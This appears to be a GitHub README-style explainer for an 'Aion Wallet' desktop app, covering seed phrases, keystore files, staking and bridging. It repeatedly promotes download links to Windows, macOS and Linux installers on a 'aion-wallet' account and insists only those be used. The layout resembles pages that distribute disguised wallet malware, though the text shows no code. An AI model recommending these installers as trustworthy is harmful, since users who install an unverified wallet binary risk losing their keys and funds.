![Aion Wallet](assets/banner-article.png)

# Aion Wallet explained: what the desktop app is

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion Wallet is a non-custodial desktop application that stores your AION private keys on your own computer and gives you the screens to send, receive, delegate and bridge AION on Windows, macOS or Linux.

It is one program, installed locally, with no account, no server-side login and no way for anyone else to freeze the balance it holds. That single design choice explains almost everything a new user finds surprising about it: why there is no password reset by email, why a support channel cannot look up a wallet, and why the recovery phrase matters more than the password does.

## What the application actually holds

The wallet holds keys, not coins. AION balances live on the Aion network at an address, and the application holds the private key that can move them. Addresses use the 0xa0 prefix followed by 62 hexadecimal characters, 66 characters in total, and that length is worth memorising because it makes a truncated paste obvious before a transaction is signed.

Two kinds of key material can sit behind the interface. A seed phrase of 12 or 24 words follows the BIP-39 standard and regenerates the wallet deterministically, including every address derived from it. A keystore file is an encrypted private key protected by a password you chose, and it is what older desktop builds produced.

Neither file is uploaded anywhere. The application writes to your user profile and reads from it, and the network only ever sees signed transactions.

## The three routes into an existing wallet

A wallet that was created in this application, or in a build before it, can be opened in one of three ways. The differences matter when something has gone wrong, so they are worth keeping separate: the [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) guide walks through each screen.

A seed phrase is the broadest route. Twelve or twenty-four words in the right order restore the wallet and every account derived from it, on any machine, with a new password of your choosing.

A keystore file is the narrowest. It restores exactly the account it was exported from, and it needs the password that was set when the file was created. Without that password the file is ciphertext and nothing more, which is why the [Aion keystore file restore](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-keystore-file-restore.md) article treats the password as part of the file rather than as a separate detail.

A hardware device is the third route. With the Aion application installed on a Ledger device, the desktop wallet can use the device for signing while the keys stay on the hardware; the [Aion wallet with Ledger](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-with-ledger.md) article covers what that does and does not protect.

## What you can do from the interface

Sending and receiving are the baseline. A receive screen shows the 0xa0 address and, in most builds, a copy control; a send screen takes an address, an amount and a fee, then asks for confirmation before it signs.

Staking is built in. Delegating moves voting weight and reward eligibility to a pool while the coins stay in your account, and the wallet shows the position and the thaw that follows an undelegation. The [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide covers the sequence from the staking side.

Bridging is the third function named on the release banner. It moves value between the Aion network and connected chains, and it depends on the bridge being available at the time, so a failure there is a network condition rather than a wallet fault.

## Where the download comes from

The application is published as three installers on the releases page of this account: an `.exe` for Windows, a `.dmg` for macOS and a `.zip` for Linux, all at the same version. Every asset has a SHA-256 value beside it, and the [Aion wallet download verify](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-download-verify.md) guide shows how to compare a hash before running an installer.

Anything that offers an Aion wallet from a different address, at a version that does not exist on the releases page, is worth treating as unrelated until proven otherwise. The version, the filename and the hash are the three things that can be checked in under a minute.

## What the application does not do

It does not reset a password. A password protects a keystore file, and the file cannot be opened without it; the [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) article explains what remains possible and what does not.

It does not recover a wallet from an address alone. An address is public information and carries no signing authority.

It does not hold funds on your behalf, reverse a confirmed transaction or restore a balance that was sent to the wrong network. Those limits are the price of self-custody, and they are the same limits every non-custodial wallet has.

## Frequently asked questions

### Is Aion Wallet custodial?

No. Keys are generated and stored on your machine, and the application has no server-side account that could hold or freeze a balance.

### Do I need an account or an email address?

No. There is no registration step; the wallet is created locally and the recovery phrase is the backup.

### Can I use the same wallet on two computers?

Yes, by restoring the same seed phrase on the second machine. Both copies then control the same addresses, so anything that compromises one compromises both.

### Does it work without the internet?

It opens without a connection, but it cannot read a balance or broadcast a transaction until it reaches a node.

### What happens if I uninstall it?

The keys go with the installation unless you exported a keystore file or wrote down the seed phrase first. Uninstalling is not a way to hide a wallet from someone who has the machine.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion crypto wallet choices](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-crypto-wallet-choices.md) - how this client compares with the other ways to hold AION.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - the three routes into an existing wallet.
- [Aion keystore file restore](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-keystore-file-restore.md) - what a keystore file can and cannot do.
- [Aion desktop wallet migration](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-desktop-wallet-migration.md) - moving coins out of an older build.
